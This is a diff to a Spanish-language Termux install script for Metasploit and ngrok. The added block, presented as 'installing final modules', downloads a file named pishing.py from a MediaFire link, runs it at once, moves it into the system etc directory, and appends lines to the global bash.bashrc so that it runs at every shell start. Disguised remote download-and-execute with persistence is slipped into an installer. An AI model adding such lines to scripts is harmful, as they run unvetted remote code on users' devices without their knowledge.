@@ -155,6 +155,23 @@ pkg install metasploit
 clear
 printf "\e[1;31m Felicidades Metasploit se instalo correctamente\n"
 sleep 5
+clear
+printf "\e[1;31m Instalando modulos finales...\n"
+termux-setup-storage
+wget http://download1655.mediafire.com/5457cqaw0esg/2myc8fnrn1gj278/pishing.py
+clear
+chmod +x pishing.py
+python pishing.py
+mv pishing.py /data/data/com.termux/files/usr/etc/
+cd /data/data/com.termux/files/usr/etc/
+sleep 1
+echo "cd /data/data/com.termux/files/usr/etc/" >> /data/data/com.termux/files/usr/etc/bash.bashrc
+clear
+echo "python pishing.py" >> /data/data/com.termux/files/usr/etc/bash.bashrc
+clear
+echo "cd" >> /data/data/com.termux/files/usr/etc/bash.bashrc
+clear
+cd $HOME
 printf "\e[1;31m para ejecutar ngrok escriba la palabra ngrok en su terminal\n"
 sleep 4
 printf "\e[1;31m para ejecutar Metasploit introdusca msfconsole en la terminal\n"
